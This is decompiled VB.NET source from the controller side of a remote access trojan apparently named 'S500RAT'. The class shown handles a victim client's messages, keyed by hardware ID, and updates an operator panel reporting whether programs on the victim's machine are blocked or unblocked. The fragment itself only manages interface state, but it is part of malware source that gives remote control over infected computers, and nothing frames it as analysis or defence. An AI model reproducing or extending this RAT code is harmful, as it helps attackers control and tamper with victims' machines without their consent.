Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000041 RID: 65
	Public Class FrmAntiMalware
		' Token: 0x06001177 RID: 4471 RVA: 0x00096F10 File Offset: 0x00095110
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formAntiMalware As FormAntiMalware = CType(Application.OpenForms("FormAntiMalware" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormAntiMalware)
				Dim flag As Boolean = formAntiMalware IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formAntiMalware.Client Is Nothing
					If flag2 Then
						formAntiMalware.Client = client
						formAntiMalware.Timer1.Enabled = True
						formAntiMalware.Block.Enabled = True
					End If
					Console.WriteLine(unpack_msgpack.ForcePathObject("State").AsString)
					Dim asString As String = unpack_msgpack.ForcePathObject("State").AsString
					If Operators.CompareString(asString, "EnabledAnti", False) <> 0 Then
						If Operators.CompareString(asString, "DisabledAnti", False) = 0 Then
							formAntiMalware.ListAni.Enabled = True
							formAntiMalware.TextBox1.Enabled = True
							formAntiMalware.Block.Enabled = True
							formAntiMalware.Block.Text = "Start"
							formAntiMalware.State.ForeColor = Color.Orange
							formAntiMalware.State.Text = "Ban has been successfully removed"
						End If
					Else
						formAntiMalware.ListAni.Enabled = False
						formAntiMalware.TextBox1.Enabled = False
						formAntiMalware.Block.Enabled = True
						formAntiMalware.Block.Text = "Stop"
						formAntiMalware.State.ForeColor = Color.LightGreen
						formAntiMalware.State.Text = "has been successfully blocked"
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
